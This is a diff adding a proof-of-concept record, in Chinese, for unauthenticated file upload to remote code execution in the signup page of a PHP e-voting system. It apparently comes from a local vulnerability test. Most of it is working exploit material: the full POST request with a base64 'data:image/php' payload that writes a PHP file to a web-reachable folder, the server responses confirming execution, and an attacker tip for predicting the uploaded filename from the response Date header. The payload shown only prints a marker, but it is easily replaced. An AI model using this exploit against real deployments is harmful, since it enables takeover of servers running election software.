@@ -1,0 +1,30 @@
+F1 POC: Secured E-Voting System voter_signup.php 未认证任意文件上传→RCE
+时间: 2026-11-09  目标: http://127.0.0.1:8138 (仅本地)
+
+== 步骤与响应 ==
+[200] GET /voter_signup
+    PHPSESSID=lmq1vreukg36tmk7cs9jvlkgkd  csrf_token=413c29746ff8aedf...
+[200] POST /voter_signup (email=pocrce191354@local.test)
+    register_ok=True
+[0] (取证) SELECT users.user_image
+    stored=uploadImage/Profile/voter_1794191354_6af12ffa1dba6.php
+[200] GET /uploadImage/Profile/voter_1794191354_6af12ffa1dba6.php
+    body=EVOTE-RCE-PROOF-42
+[RCE-CONFIRMED] VERDICT
+    预期输出 EVOTE-RCE-PROOF-42
+
+== 完整 POST 请求体（urlencoded，关键载荷）==
+POST /voter_signup HTTP/1.1
+Host: 127.0.0.1:8138
+Cookie: PHPSESSID=<见上>
+Content-Type: application/x-www-form-urlencoded
+
+csrf_token=413c29746ff8aedfdc81341f9a4f0f0eb899ae994e49ffc616f797b9cd0a9b50&full_name=POC%20RCE&nickname=pocrce&email=pocrce191354%40local.test&phone=07094191354&password=Poc%2312345&confirm_password=Poc%2312345&user_image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgZWNobyAiRVZPVEUtUkNFLVBST09GLSIuKDcqNik7ID8%2B&register_btn=1
+
+== payload 说明 ==
+user_image=data:image/php;base64,PD9waHAgZWNobyAiRVZPVEUtUkNFLVBST09GLSIuKDcqNik7ID8+
+voter_signup.php:47-63 从 'data:image/' 后取子串作为扩展名（无白名单/无内容校验），
+拼成 voter_<time>_<uniqid>.<ext> 后 file_put_contents 写入 web 可直达的 uploadImage/Profile/。
+落地文件: /uploadImage/Profile/voter_1794191354_6af12ffa1dba6.php （php -S 无目录列表，故演示经 users.user_image 取名；
+真实攻击者可用响应 Date 头做时间窗口预测 voter_<秒>_<uniqid 13hex>，或经后台用户列表页披露）
+执行结果: HTTP 200 body=EVOTE-RCE-PROOF-42
